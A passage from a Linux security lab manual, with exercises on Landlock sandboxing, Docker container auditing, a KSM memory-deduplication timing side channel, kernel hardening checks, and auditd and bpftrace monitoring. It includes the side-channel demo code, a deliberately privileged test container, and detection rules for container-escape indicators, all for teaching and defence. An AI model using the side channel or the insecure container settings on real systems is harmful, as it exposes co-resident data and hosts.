        struct landlock_net_port_attr port_attr;

        /* Allow binding to port 8080 */
        port_attr.allowed_access = LANDLOCK_ACCESS_NET_BIND_TCP;
        port_attr.port = 8080;
        if (landlock_add_rule(rs_fd, LANDLOCK_RULE_NET_PORT, &port_attr, 0) == 0)
            printf("  [+] Allow bind TCP :8080\n");

        /* Allow connecting to port 443 (HTTPS) */
        port_attr.allowed_access = LANDLOCK_ACCESS_NET_CONNECT_TCP;
        port_attr.port = 443;
        if (landlock_add_rule(rs_fd, LANDLOCK_RULE_NET_PORT, &port_attr, 0) == 0)
            printf("  [+] Allow connect TCP :443\n");

        /* Allow connecting to port 53 (DNS) */
        port_attr.port = 53;
        if (landlock_add_rule(rs_fd, LANDLOCK_RULE_NET_PORT, &port_attr, 0) == 0)
            printf("  [+] Allow connect TCP :53\n");
    }

    /* Step 4: Set NO_NEW_PRIVS (required before landlock_restrict_self) */
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) < 0) {
        perror("prctl(NO_NEW_PRIVS)");
        close(rs_fd);
        return 1;
    }

    /* Step 5: Enforce the sandbox — no going back */
    if (landlock_restrict_self(rs_fd, 0) < 0) {
        perror("landlock_restrict_self");
        close(rs_fd);
        return 1;
    }
    close(rs_fd);

    printf("\n[+] SANDBOX ACTIVE — restrictions enforced\n\n");

    /* Step 6: Test the sandbox */
    printf("--- Testing sandbox restrictions ---\n");

    /* Should succeed: read /etc/hostname */
    int fd = open("/etc/hostname", O_RDONLY);
    if (fd >= 0) {
        char buf[256];
        ssize_t n = read(fd, buf, sizeof(buf) - 1);
        if (n > 0) { buf[n] = '\0'; printf("  [ok] Read /etc/hostname: %s", buf); }
        close(fd);
    } else {
        printf("  [!!] Cannot read /etc/hostname: %s\n", strerror(errno));
    }

    /* Should succeed: write to /tmp */
    fd = open("/tmp/landlock_test", O_CREAT | O_WRONLY, 0644);
    if (fd >= 0) {
        write(fd, "sandbox test\n", 13);
        close(fd);
        printf("  [ok] Wrote to /tmp/landlock_test\n");
        unlink("/tmp/landlock_test");
    } else {
        printf("  [!!] Cannot write to /tmp: %s\n", strerror(errno));
    }

    /* Should FAIL: write to /etc */
    fd = open("/etc/landlock_test", O_CREAT | O_WRONLY, 0644);
    if (fd >= 0) {
        close(fd);
        printf("  [!!] UNEXPECTED: wrote to /etc (sandbox broken!)\n");
        unlink("/etc/landlock_test");
    } else {
        printf("  [ok] Cannot write to /etc: %s (expected)\n", strerror(errno));
    }

    /* Should FAIL: read /root */
    fd = open("/root/.bashrc", O_RDONLY);
    if (fd >= 0) {
        close(fd);
        printf("  [!!] UNEXPECTED: read /root/.bashrc (sandbox broken!)\n");
    } else {
        printf("  [ok] Cannot read /root/.bashrc: %s (expected)\n", strerror(errno));
    }

    /* Should FAIL: execute from /home */
    if (access("/home", X_OK) == 0) {
        printf("  [!!] Can traverse /home (sandbox may be too broad)\n");
    } else {
        printf("  [ok] Cannot access /home: %s (expected)\n", strerror(errno));
    }

    printf("\n[+] Sandbox test complete\n");
    return 0;
}
```

**Build and test:**

```bash
gcc -o landlock_sandbox landlock_sandbox.c -Wall
# Run as unprivileged user — Landlock does NOT require root
./landlock_sandbox
```

---

### Exercise 7: Container Security Audit

**Objective:** Systematically audit Docker container configurations for capability, namespace, cgroup, seccomp, and LSM weaknesses.

#### Step 7.1 — Comprehensive Docker Audit Script

Create `container_audit.py`:

```python
#!/usr/bin/env python3
"""container_audit.py — Comprehensive Docker container security audit."""
import json
import subprocess
import sys
import os

DANGEROUS_CAPS = {
    "SYS_ADMIN", "SYS_MODULE", "SYS_RAWIO", "SYS_PTRACE",
    "DAC_OVERRIDE", "DAC_READ_SEARCH", "NET_RAW", "NET_ADMIN",
    "MAC_OVERRIDE", "MAC_ADMIN", "SETUID", "SETGID",
    "MKNOD", "SYS_CHROOT", "BPF", "PERFMON",
}

DEFAULT_DOCKER_CAPS = {
    "CHOWN", "DAC_OVERRIDE", "FSETID", "FOWNER", "MKNOD",
    "NET_RAW", "SETGID", "SETUID", "SETFCAP", "SETPCAP",
    "NET_BIND_SERVICE", "SYS_CHROOT", "KILL", "AUDIT_WRITE",
}

SEVERITY_COLORS = {
    "CRITICAL": "\033[91m",
    "HIGH":     "\033[93m",
    "MEDIUM":   "\033[33m",
    "LOW":      "\033[36m",
    "OK":       "\033[92m",
}
RESET = "\033[0m"

def colored(text, severity):
    return f"{SEVERITY_COLORS.get(severity, '')}{text}{RESET}"

def run_cmd(cmd):
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        return result.stdout.strip()
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return ""

def get_containers():
    output = run_cmd(["docker", "ps", "-q"])
    if not output:
        return []
    return output.splitlines()

def inspect_container(cid):
    output = run_cmd(["docker", "inspect", cid])
    if not output:
        return None
    return json.loads(output)[0]

def audit_container(info):
    findings = []
    name = info.get("Name", "").strip("/")
    cid = info.get("Id", "")[:12]
    host_config = info.get("HostConfig", {})

    print(f"\n{'='*60}")
    print(f"  Container: {name} ({cid})")
    print(f"  Image: {info.get('Config', {}).get('Image', '?')}")
    print(f"{'='*60}")

    # 1. Privileged mode
    if host_config.get("Privileged"):
        findings.append(("CRITICAL", "Running in PRIVILEGED mode — full host access"))

    # 2. Capabilities
    caps_add = host_config.get("CapAdd") or []
    caps_drop = host_config.get("CapDrop") or []

    if not caps_drop or "ALL" not in [c.upper() for c in caps_drop]:
        findings.append(("MEDIUM", f"Not dropping ALL caps (drops: {caps_drop or 'none'})"))

    dangerous_added = [c for c in caps_add if c.upper() in DANGEROUS_CAPS]
    if dangerous_added:
        findings.append(("HIGH", f"Dangerous caps added: {', '.join(dangerous_added)}"))

    # Check for default dangerous caps not dropped
    default_dangerous = DEFAULT_DOCKER_CAPS & DANGEROUS_CAPS
    for dc in default_dangerous:
        if dc not in [c.upper() for c in caps_drop]:
            findings.append(("LOW", f"Default dangerous cap not dropped: {dc}"))

    # 3. Namespace sharing
    pid_mode = host_config.get("PidMode", "")
    if pid_mode == "host":
        findings.append(("CRITICAL", "Shares HOST PID namespace — can access all host processes"))

    net_mode = host_config.get("NetworkMode", "")
    if net_mode == "host":
        findings.append(("HIGH", "Shares HOST network namespace"))

    ipc_mode = host_config.get("IpcMode", "")
    if ipc_mode == "host":
        findings.append(("HIGH", "Shares HOST IPC namespace"))

    uts_mode = host_config.get("UTSMode", "")
    if uts_mode == "host":
        findings.append(("MEDIUM", "Shares HOST UTS namespace"))

    user_ns = host_config.get("UsernsMode", "")
    if user_ns == "host":
        findings.append(("HIGH", "Shares HOST user namespace"))

    # 4. Security options
    sec_opts = host_config.get("SecurityOpt") or []
    for opt in sec_opts:
        if "unconfined" in opt.lower():
            if "seccomp" in opt.lower():
                findings.append(("HIGH", "Seccomp DISABLED (unconfined)"))
            if "apparmor" in opt.lower():
                findings.append(("HIGH", "AppArmor DISABLED (unconfined)"))
        if "no-new-privileges" in opt.lower():
            findings.append(("OK", "no-new-privileges set"))

    # 5. Read-only rootfs
    if not host_config.get("ReadonlyRootfs"):
        findings.append(("MEDIUM", "Root filesystem is WRITABLE"))

    # 6. Sensitive mounts
    mounts = info.get("Mounts", [])
    for mount in mounts:
        src = mount.get("Source", "")
        dst = mount.get("Destination", "")
        rw = mount.get("RW", False)

        if "docker.sock" in src:
            findings.append(("CRITICAL", f"Docker socket mounted: {src} → {dst}"))
        elif src.startswith("/proc") and rw:
            findings.append(("CRITICAL", f"Host /proc mounted RW: {src} → {dst}"))
        elif src.startswith("/sys") and rw:
            findings.append(("HIGH", f"Host /sys mounted RW: {src} → {dst}"))
        elif src in ("/", "/etc", "/var", "/root", "/home"):
            sev = "CRITICAL" if rw else "HIGH"
            findings.append((sev, f"Sensitive host path mounted: {src} → {dst} ({'RW' if rw else 'RO'})"))

    # 7. Resource limits
    memory = host_config.get("Memory", 0)
    if memory == 0:
        findings.append(("MEDIUM", "No memory limit set"))

    pids_limit = host_config.get("PidsLimit", 0)
    if pids_limit == 0 or pids_limit == -1:
        findings.append(("MEDIUM", "No PID limit set (fork bomb possible)"))

    cpu_quota = host_config.get("CpuQuota", 0)
    if cpu_quota == 0:
        findings.append(("LOW", "No CPU quota set"))

    # 8. User
    user = info.get("Config", {}).get("User", "")
    if not user or user == "root" or user == "0":
        findings.append(("MEDIUM", "Running as root inside container"))

    # Print findings
    for severity, message in findings:
        print(f"  [{colored(severity, severity):>20s}] {message}")

    if not findings:
        print(f"  [{colored('OK', 'OK')}] No significant issues found")

    return findings

def main():
    print("=" * 60)
    print("   Docker Container Security Audit")
    print("=" * 60)

    containers = get_containers()
    if not containers:
        print("\n  No running containers found.")
        return

    print(f"\n  Found {len(containers)} running container(s)")

    all_findings = {}
    for cid in containers:
        info = inspect_container(cid)
        if info:
            name = info.get("Name", "").strip("/")
            all_findings[name] = audit_container(info)

    # Summary
    print(f"\n{'='*60}")
    print("   SUMMARY")
    print(f"{'='*60}")

    total = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "OK": 0}
    for name, findings in all_findings.items():
        for sev, _ in findings:
            total[sev] = total.get(sev, 0) + 1

    for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW"):
        count = total.get(sev, 0)
        if count > 0:
            print(f"  {colored(sev, sev)}: {count}")

    if total.get("CRITICAL", 0) > 0:
        print(f"\n  {colored('ACTION REQUIRED: Fix CRITICAL issues immediately', 'CRITICAL')}")

if __name__ == "__main__":
    main()
```

**Run the audit:**

```bash
# Start some test containers with various security profiles
docker run -d --name secure --cap-drop=ALL --read-only --user 1000 alpine sleep 3600
docker run -d --name insecure --privileged --pid=host alpine sleep 3600
docker run -d --name moderate --cap-add=NET_RAW alpine sleep 3600

# Run audit
python3 container_audit.py

# Cleanup
docker rm -f secure insecure moderate
```

---

### Exercise 8: Kernel Memory Security — KSM Side Channel and KFENCE Detection

**Objective:** Demonstrate the KSM timing side channel for cross-process information leakage, explore KFENCE error detection output, and verify kernel memory hardening settings.

#### Step 8.1 — KSM Timing Side Channel

Create `ksm_sidechannel.c`:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <time.h>
#include <errno.h>

#define PAGE_SIZE 4096
#define ITERATIONS 100

static long long now_ns(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (long long)ts.tv_sec * 1000000000LL + ts.tv_nsec;
}

int main(void) {
    printf("=== KSM Timing Side Channel Demo ===\n\n");

    /* Check if KSM is enabled */
    FILE *f = fopen("/sys/kernel/mm/ksm/run", "r");
    if (f) {
        int ksm_run = 0;
        fscanf(f, "%d", &ksm_run);
        fclose(f);
        printf("[*] KSM status: %s\n", ksm_run ? "ENABLED" : "DISABLED");
        if (!ksm_run) {
            printf("[!] KSM is disabled. Enable with:\n");
            printf("    echo 1 | sudo tee /sys/kernel/mm/ksm/run\n");
            printf("[*] Proceeding anyway to show timing difference concept\n");
        }
    }

    /* Allocate two pages with MADV_MERGEABLE */
    void *page_a = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    void *page_b = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page_a == MAP_FAILED || page_b == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    /* Fill both pages with identical content */
    memset(page_a, 'A', PAGE_SIZE);
    memset(page_b, 'A', PAGE_SIZE);

    /* Mark as mergeable */
    if (madvise(page_a, PAGE_SIZE, MADV_MERGEABLE) < 0)
        printf("[!] MADV_MERGEABLE failed for page_a: %s\n", strerror(errno));
    if (madvise(page_b, PAGE_SIZE, MADV_MERGEABLE) < 0)
        printf("[!] MADV_MERGEABLE failed for page_b: %s\n", strerror(errno));

    printf("[*] Pages allocated and marked MADV_MERGEABLE\n");
    printf("[*] Waiting for KSM to merge (if enabled)...\n");

    /* In production, we'd wait for ksmd to scan. For demo, wait a bit. */
    f = fopen("/sys/kernel/mm/ksm/pages_sharing", "r");
    if (f) {
        unsigned long sharing_before = 0;
        fscanf(f, "%lu", &sharing_before);
        fclose(f);
        printf("[*] Pages sharing before wait: %lu\n", sharing_before);
    }

    sleep(5);  /* Wait for ksmd scan cycle */

    f = fopen("/sys/kernel/mm/ksm/pages_sharing", "r");
    if (f) {
        unsigned long sharing_after = 0;
        fscanf(f, "%lu", &sharing_after);
        fclose(f);
        printf("[*] Pages sharing after wait: %lu\n", sharing_after);
    }

    /* Timing test: write to merged page (COW) vs unmerged page */
    printf("\n[*] Timing test: COW fault (merged) vs direct write (unmerged)\n");

    long long total_merged = 0, total_unmerged = 0;

    for (int i = 0; i < ITERATIONS; i++) {
        /* Reset pages to identical content → allow merging */
        memset(page_a, 'A', PAGE_SIZE);
        memset(page_b, 'B', PAGE_SIZE);  /* Different content → not merged */

        if (i > 0) usleep(100);

        /* Time write to page_a (potentially merged) */
        long long t1 = now_ns();
        ((volatile char *)page_a)[0] = 'X';
        long long t2 = now_ns();
        total_merged += (t2 - t1);

        /* Time write to page_b (different content, not merged) */
        long long t3 = now_ns();
        ((volatile char *)page_b)[0] = 'Y';
        long long t4 = now_ns();
        total_unmerged += (t4 - t3);
    }

    printf("  Average write time (potentially merged page): %lld ns\n",
           total_merged / ITERATIONS);
    printf("  Average write time (unmerged page):           %lld ns\n",
           total_unmerged / ITERATIONS);
    printf("  Ratio: %.2fx\n",
           (double)total_merged / (double)(total_unmerged ? total_unmerged : 1));

    if (total_merged > total_unmerged * 2) {
        printf("\n  [!] Significant timing difference detected — KSM side channel present\n");
        printf("      An attacker could detect page content in co-resident processes/VMs\n");
    } else {
        printf("\n  [*] No significant difference — KSM may be disabled or pages not merged\n");
    }

    /* Mitigation info */
    printf("\n--- Mitigation ---\n");
    printf("  Disable KSM: echo 0 | sudo tee /sys/kernel/mm/ksm/run\n");
    printf("  Do not use MADV_MERGEABLE for sensitive data\n");
    printf("  Cloud providers (AWS, GCP) disable KSM by default\n");

    munmap(page_a, PAGE_SIZE);
    munmap(page_b, PAGE_SIZE);
    return 0;
}
```

#### Step 8.2 — Kernel Memory Hardening Audit

Create `kernel_mem_audit.sh`:

```bash
#!/bin/bash
# kernel_mem_audit.sh — Audit kernel memory security features

echo "=========================================="
echo "   Kernel Memory Security Audit"
echo "=========================================="

CONFIG="/boot/config-$(uname -r)"

check() {
    local opt="$1" desc="$2" rec="$3"
    local val=""
    if [ -f "$CONFIG" ]; then
        val=$(grep "^${opt}=" "$CONFIG" 2>/dev/null | cut -d= -f2)
    elif [ -f /proc/config.gz ]; then
        val=$(zcat /proc/config.gz 2>/dev/null | grep "^${opt}=" | cut -d= -f2)
    fi
    if [ "$val" = "y" ] || [ "$val" = "m" ]; then
        printf "  [\033[92mOK\033[0m]  %-45s (%s)\n" "$desc" "$opt=$val"
    else
        printf "  [\033[91m!!\033[0m]  %-45s (%s=%s) → %s\n" "$desc" "$opt" "${val:-not set}" "$rec"
    fi
}

echo ""
echo "--- Stack Protection ---"
check "CONFIG_STACKPROTECTOR" "Stack protector (basic)" "Enable"
check "CONFIG_STACKPROTECTOR_STRONG" "Stack protector (strong)" "Enable — covers more functions"
check "CONFIG_VMAP_STACK" "Vmapped kernel stacks" "Enable — guard pages on stack"
check "CONFIG_RANDOMIZE_KSTACK_OFFSET" "Randomize kernel stack offset" "Enable — per-syscall jitter"

echo ""
echo "--- Memory Sanitizers ---"
check "CONFIG_KFENCE" "KFENCE (production OOB/UAF detect)" "Enable for production"
check "CONFIG_KASAN" "KASAN (development memory checker)" "Enable for dev/CI only"
check "CONFIG_INIT_ON_ALLOC_DEFAULT_ON" "Zero-init heap allocations" "Enable — prevents info leak"
check "CONFIG_INIT_ON_FREE_DEFAULT_ON" "Zero-wipe freed memory" "Enable — prevents UAF info leak"

echo ""
echo "--- Code Integrity ---"
check "CONFIG_STRICT_KERNEL_RWX" "Kernel text read-only + NX data" "Enable — prevents code injection"
check "CONFIG_STRICT_MODULE_RWX" "Module text read-only" "Enable"
check "CONFIG_MODULE_SIG" "Module signature verification" "Enable"
check "CONFIG_MODULE_SIG_FORCE" "Force module signatures" "Enable in production"
check "CONFIG_SECURITY_LOCKDOWN_LSM" "Lockdown LSM" "Enable — protect running kernel"

echo ""
echo "--- Address Space Layout ---"
check "CONFIG_RANDOMIZE_BASE" "KASLR" "Enable — randomize kernel base"
check "CONFIG_PAGE_TABLE_ISOLATION" "KPTI (Meltdown mitigation)" "Enable"

echo ""
echo "--- KSM (Side Channel Risk) ---"
KSM_RUN=$(cat /sys/kernel/mm/ksm/run 2>/dev/null || echo "N/A")
KSM_SHARING=$(cat /sys/kernel/mm/ksm/pages_sharing 2>/dev/null || echo "N/A")
if [ "$KSM_RUN" = "1" ]; then
    printf "  [\033[93m!!\033[0m]  KSM ENABLED — timing side channel risk (pages sharing: %s)\n" "$KSM_SHARING"
else
    printf "  [\033[92mOK\033[0m]  KSM disabled\n"
fi

echo ""
echo "--- Encrypted Swap ---"
SWAP_DEVS=$(swapon --show=NAME --noheadings 2>/dev/null)
if [ -z "$SWAP_DEVS" ]; then
    printf "  [\033[92mOK\033[0m]  No swap devices (or swap disabled)\n"
else
    for dev in $SWAP_DEVS; do
        if echo "$dev" | grep -q "dm-\|crypt\|luks"; then
            printf "  [\033[92mOK\033[0m]  Swap on encrypted device: %s\n" "$dev"
        elif echo "$dev" | grep -q "zram"; then
            printf "  [\033[93m--\033[0m]  Swap on zram (compressed, not encrypted): %s\n" "$dev"
        else
            printf "  [\033[91m!!\033[0m]  Swap on UNENCRYPTED device: %s\n" "$dev"
        fi
    done
fi

echo ""
echo "--- Lockdown Mode ---"
LOCKDOWN=$(cat /sys/kernel/security/lockdown 2>/dev/null || echo "N/A")
printf "  Lockdown: %s\n" "$LOCKDOWN"
if echo "$LOCKDOWN" | grep -q "none"; then
    printf "  [\033[91m!!\033[0m]  Lockdown not active — kernel writable from userspace\n"
fi
```

---

## PART B: DEFENSIVE (Protection Systems)

### Exercise 9: Comprehensive Capability and Namespace Auditing

**Objective:** Deploy audit rules for capability manipulation, namespace creation, and container escape indicators. Build an automated audit log analyzer.

#### Step 9.1 — Auditd Rules for Capabilities, Namespaces, and LSMs

Create `/etc/audit/rules.d/caps-ns-lsm.rules`:

```bash
#!/bin/bash
# deploy_audit_rules.sh — Deploy comprehensive audit rules
# Run as root on VM-DEFENSE

cat > /etc/audit/rules.d/90-caps-ns-lsm.rules << 'AUDIT_RULES'
## === Capability Monitoring ===
# capset syscall — direct capability set modification
-a always,exit -F arch=b64 -S capset -k cap_modification
# prctl ambient cap manipulation (PR_CAP_AMBIENT = 47 = 0x2f)
-a always,exit -F arch=b64 -S prctl -F a0=47 -k ambient_cap
# prctl bounding set drop (PR_CAPBSET_DROP = 24 = 0x18)
-a always,exit -F arch=b64 -S prctl -F a0=24 -k bset_drop
# prctl securebits (PR_SET_SECUREBITS = 28 = 0x1c)
-a always,exit -F arch=b64 -S prctl -F a0=28 -k securebits
# prctl NO_NEW_PRIVS (PR_SET_NO_NEW_PRIVS = 38 = 0x26)
-a always,exit -F arch=b64 -S prctl -F a0=38 -k no_new_privs
# prctl dumpable (anti-debug indicator)
-a always,exit -F arch=b64 -S prctl -F a0=4 -k set_dumpable
# File capability changes
-a always,exit -F arch=b64 -S setxattr -F a2=0x726f6f74 -k file_cap_set

## === Namespace Monitoring ===
# unshare — new namespace creation
-a always,exit -F arch=b64 -S unshare -k ns_unshare
# setns — entering existing namespace
-a always,exit -F arch=b64 -S setns -k ns_setns
# clone with CLONE_NEWUSER (0x10000000)
-a always,exit -F arch=b64 -S clone -F a0&0x10000000 -k clone_newuser
# clone3 — modern namespace creation
-a always,exit -F arch=b64 -S clone3 -k clone3
# pivot_root — container rootfs setup
-a always,exit -F arch=b64 -S pivot_root -k pivot_root
# mount/umount — filesystem manipulation
-a always,exit -F arch=b64 -S mount -F auid!=4294967295 -k mount_op
-a always,exit -F arch=b64 -S umount2 -k umount_op

## === LSM / SELinux / AppArmor Monitoring ===
# SELinux config changes
-w /etc/selinux/ -p wa -k selinux_config
-w /usr/sbin/setenforce -p x -k selinux_enforce
-w /usr/sbin/semanage -p x -k selinux_manage
-w /usr/sbin/setsebool -p x -k selinux_bool
-w /usr/sbin/restorecon -p x -k selinux_restorecon
# AppArmor profile changes
-w /etc/apparmor.d/ -p wa -k apparmor_profile
-w /sbin/apparmor_parser -p x -k apparmor_parser
# Landlock syscalls
-a always,exit -F arch=b64 -S 444 -k landlock_create  # landlock_create_ruleset
-a always,exit -F arch=b64 -S 445 -k landlock_add_rule
-a always,exit -F arch=b64 -S 446 -k landlock_restrict # landlock_restrict_self

## === Cgroup Monitoring ===
-w /sys/fs/cgroup/ -p wa -k cgroup_write

## === Kernel Module Loading ===
-a always,exit -F arch=b64 -S init_module -S finit_module -k module_load
-a always,exit -F arch=b64 -S delete_module -k module_unload

## === Container Escape Indicators ===
# Reading host namespace files
-w /proc/1/ns/ -p r -k host_ns_access
# Docker socket access
-w /var/run/docker.sock -p rwa -k docker_socket
AUDIT_RULES

# Load rules
augenrules --load
auditctl -l | wc -l
echo "[+] Audit rules deployed. $(auditctl -l | wc -l) rules active."
```

#### Step 9.2 — Audit Log Analyzer

Create `caps_ns_analyzer.py`:

```python
#!/usr/bin/env python3
"""caps_ns_analyzer.py — Analyze audit logs for capability/namespace/LSM events."""
import re
import sys
import os
from collections import defaultdict
from datetime import datetime

ATTACK_PATTERNS = {
    "cap_escalation": {
        "keys": ["cap_modification", "ambient_cap"],
        "description": "Capability set escalation",
        "severity": "HIGH",
        "mitre": "T1068 — Exploitation for Privilege Escalation",
    },
    "namespace_escape": {
        "keys": ["ns_setns", "host_ns_access"],
        "description": "Namespace boundary crossing (potential container escape)",
        "severity": "CRITICAL",
        "mitre": "T1611 — Escape to Host",
    },
    "namespace_creation": {
        "keys": ["ns_unshare", "clone_newuser", "clone3"],
        "description": "New namespace creation (potential attack surface expansion)",
        "severity": "MEDIUM",
        "mitre": "T1611 — Escape to Host",
    },
    "lsm_manipulation": {
        "keys": ["selinux_enforce", "selinux_bool", "apparmor_profile"],
        "description": "LSM policy modification",
        "severity": "HIGH",
        "mitre": "T1562 — Impair Defenses",
    },
    "container_breakout_prep": {
        "keys": ["mount_op", "pivot_root", "cgroup_write"],
        "description": "Container breakout preparation (mount/cgroup manipulation)",
        "severity": "HIGH",
        "mitre": "T1611 — Escape to Host",
    },
    "module_loading": {
        "keys": ["module_load", "module_unload"],
        "description": "Kernel module loading/unloading",
        "severity": "CRITICAL",
        "mitre": "T1547.006 — Kernel Modules and Extensions",
    },
    "docker_socket_access": {
        "keys": ["docker_socket"],
        "description": "Docker socket access (full container control)",
        "severity": "CRITICAL",
        "mitre": "T1611 — Escape to Host",
    },
    "privilege_restriction": {
        "keys": ["bset_drop", "no_new_privs", "landlock_restrict"],
        "description": "Privilege restriction (defensive — expected behavior)",
        "severity": "INFO",
        "mitre": "Defensive",
    },
}

def parse_audit_line(line):
    """Parse a single audit log line into a dict."""
    event = {}

    # Extract timestamp
    ts_match = re.search(r'msg=audit\((\d+\.\d+):\d+\)', line)
    if ts_match:
        event['timestamp'] = float(ts_match.group(1))
        event['time_str'] = datetime.fromtimestamp(event['timestamp']).strftime('%Y-%m-%d %H:%M:%S')

    # Extract key
    key_match = re.search(r'key="([^"]*)"', line)
    if key_match:
        event['key'] = key_match.group(1)

    # Extract common fields
    for field in ['syscall', 'pid', 'ppid', 'uid', 'auid', 'comm', 'exe', 'a0', 'a1']:
        match = re.search(rf'{field}=(\S+)', line)
        if match:
            event[field] = match.group(1)

    # Extract type
    type_match = re.search(r'^type=(\S+)', line)
    if type_match:
        event['type'] = type_match.group(1)

    return event

def analyze_events(events):
    """Group events by attack pattern and report."""
    pattern_hits = defaultdict(list)

    for event in events:
        key = event.get('key', '')
        for pattern_name, pattern in ATTACK_PATTERNS.items():
            if key in pattern['keys']:
                pattern_hits[pattern_name].append(event)

    return pattern_hits

def main():
    log_file = sys.argv[1] if len(sys.argv) > 1 else "/var/log/audit/audit.log"

    print("=" * 70)
    print("   Capability / Namespace / LSM Audit Log Analysis")
    print(f"   Source: {log_file}")
    print("=" * 70)

    if not os.path.exists(log_file):
        print(f"\n[!] Log file not found: {log_file}")
        return

    # Parse events
    events = []
    try:
        with open(log_file, 'r') as f:
            for line in f:
                event = parse_audit_line(line)
                if event.get('key'):
                    events.append(event)
    except PermissionError:
        print("[!] Permission denied. Run as root.")
        return

    if not events:
        print("\n[*] No matching audit events found.")
        return

    print(f"\n[*] Parsed {len(events)} relevant events")

    # Analyze
    pattern_hits = analyze_events(events)

    # Report by severity
    for severity in ["CRITICAL", "HIGH", "MEDIUM", "INFO"]:
        for pattern_name, pattern in ATTACK_PATTERNS.items():
            if pattern['severity'] != severity:
                continue
            hits = pattern_hits.get(pattern_name, [])
            if not hits:
                continue

            print(f"\n{'─'*70}")
            print(f"  [{severity}] {pattern['description']}")
            print(f"  MITRE: {pattern['mitre']}")
            print(f"  Events: {len(hits)}")
            print(f"{'─'*70}")

            # Show recent events
            for event in hits[-5:]:
                ts = event.get('time_str', '?')
                pid = event.get('pid', '?')
                comm = event.get('comm', '?').strip('"')
                uid = event.get('uid', '?')
                key = event.get('key', '?')
                print(f"    {ts}  PID={pid:>7s}  UID={uid:>5s}  "
                      f"comm={comm:>15s}  key={key}")

            if len(hits) > 5:
                print(f"    ... and {len(hits) - 5} more events")

    # Summary
    print(f"\n{'='*70}")
    print("   SUMMARY")
    print(f"{'='*70}")
    totals = defaultdict(int)
    for pattern_name, hits in pattern_hits.items():
        if hits:
            sev = ATTACK_PATTERNS[pattern_name]['severity']
            totals[sev] += len(hits)
            print(f"  [{sev:>8s}] {ATTACK_PATTERNS[pattern_name]['description']}: "
                  f"{len(hits)} events")

    if totals.get("CRITICAL", 0) > 0:
        print(f"\n  ⚠ CRITICAL findings require immediate investigation")

if __name__ == "__main__":
    main()
```

#### Step 9.3 — bpftrace Probes for Real-Time Monitoring

Create `caps_ns_monitor.bt`:

```bash
#!/usr/bin/env bpftrace
/* caps_ns_monitor.bt — Real-time monitoring of capability and namespace operations */

BEGIN {
    printf("=== Caps/NS/LSM Monitor (bpftrace) ===\n");
    printf("%-20s %-6s %-16s %-10s %s\n",
           "TIME", "PID", "COMM", "EVENT", "DETAILS");
}

/* Monitor capset syscall */
tracepoint:syscalls:sys_enter_capset {
    printf("%-20s %-6d %-16s %-10s hdrp=%p datap=%p\n",
           strftime("%H:%M:%S.%f", nsecs), pid, comm, "CAPSET",
           args->header, args->data);
}

/* Monitor prctl for cap-related operations */
tracepoint:syscalls:sys_enter_prctl {
    /* PR_CAP_AMBIENT = 47, PR_CAPBSET_DROP = 24, PR_SET_SECUREBITS = 28 */
    if (args->option == 47 || args->option == 24 || args->option == 28) {
        printf("%-20s %-6d %-16s %-10s option=%d arg2=%d arg3=%d\n",
               strftime("%H:%M:%S.%f", nsecs), pid, comm, "PRCTL_CAP",
               args->option, args->arg2, args->arg3);
    }
}

/* Monitor unshare — namespace creation */
tracepoint:syscalls:sys_enter_unshare {
    printf("%-20s %-6d %-16s %-10s flags=0x%x",
           strftime("%H:%M:%S.%f", nsecs), pid, comm, "UNSHARE",
           args->unshare_flags);
    if (args->unshare_flags & 0x10000000) { printf(" NEWUSER"); }
    if (args->unshare_flags & 0x00020000) { printf(" NEWNS"); }
    if (args->unshare_flags & 0x20000000) { printf(" NEWPID"); }
    if (args->unshare_flags & 0x40000000) { printf(" NEWNET"); }
    printf("\n");
}

/* Monitor setns — entering existing namespace */
tracepoint:syscalls:sys_enter_setns {
    printf("%-20s %-6d %-16s %-10s fd=%d nstype=0x%x\n",
           strftime("%H:%M:%S.%f", nsecs), pid, comm, "SETNS",
           args->fd, args->nstype);
}

/* Monitor mount syscall */
tracepoint:syscalls:sys_enter_mount {
    printf("%-20s %-6d %-16s %-10s src=%s target=%s\n",
           strftime("%H:%M:%S.%f", nsecs), pid, comm, "MOUNT",
           str(args->dev_name), str(args->dir_name));
}

/* Monitor pivot_root */
tracepoint:syscalls:sys_enter_pivot_root {
    printf("%-20s %-6d %-16s %-10s new=%s old=%s\n",
           strftime("%H:%M:%S.%f", nsecs), pid, comm, "PIVOT_ROOT",
           str(args->new_root), str(args->put_old));
}

/* Monitor kernel module loading */
tracepoint:syscalls:sys_enter_finit_module {
    printf("%-20s %-6d %-16s %-10s fd=%d flags=%d\n",
           strftime("%H:%M:%S.%f", nsecs), pid, comm, "MODLOAD",
           args->fd, args->flags);
}
```

**Deploy monitoring:**

```bash
# Terminal 1: Start bpftrace monitor
sudo bpftrace caps_ns_monitor.bt

# Terminal 2: Trigger events to observe
unshare --user --map-root-user bash -c 'echo "in user ns"; exit'
sudo mount -t tmpfs tmpfs /tmp/test_mount && sudo umount /tmp/test_mount
```

---

### Exercise 10: Hardening Deployment — systemd, AppArmor, Sysctl

**Objective:** Deploy a production-grade hardening configuration covering capabilities, namespaces, cgroups, AppArmor profiles, and kernel sysctl settings.

#### Step 10.1 — systemd Service Hardening Template

Create `hardened_service_template.sh`:

```bash
#!/bin/bash
# hardened_service_template.sh — Generate a hardened systemd unit file

SERVICE_NAME="${1:-myservice}"
BINARY_PATH="${2:-/usr/local/bin/$SERVICE_NAME}"
SERVICE_USER="${3:-$SERVICE_NAME}"

echo "Generating hardened systemd unit for: $SERVICE_NAME"

cat > "/tmp/${SERVICE_NAME}.service" << EOF
[Unit]
Description=$SERVICE_NAME (hardened)
After=network.target

[Service]
Type=simple
ExecStart=$BINARY_PATH
User=$SERVICE_USER
Group=$SERVICE_USER

